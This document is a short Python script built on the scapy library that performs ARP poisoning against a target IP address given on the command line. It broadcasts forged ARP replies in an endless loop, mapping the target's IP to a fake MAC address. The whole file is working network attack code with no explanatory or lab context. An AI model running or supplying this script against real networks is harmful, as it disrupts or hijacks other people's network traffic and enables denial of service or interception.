#!/usr/bin/python3
from scapy.all import *
from argparse import ArgumentParser
import os
import time

parser = ArgumentParser()

parser.add_argument('-t', dest='target', required=True, type=str, help='The targets ip address')

args= parser.parse_args()

def start_poison():
  target_arp = ARP()
  target_arp.op = 2
  target_arp.hwdst = 'ff:ff:ff:ff:ff:ff'
  target_arp.psrc = args.target
  target_arp.hwsrc = 'aa:aa:aa:aa:aa:aa'

  while True:
    try:
      print("[*] Poisoning network")
      sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/target_arp)
    except KeyboardInterrupt:
      break

  print("[*] All done!")

if __name__ == '__main__':
  start_poison()
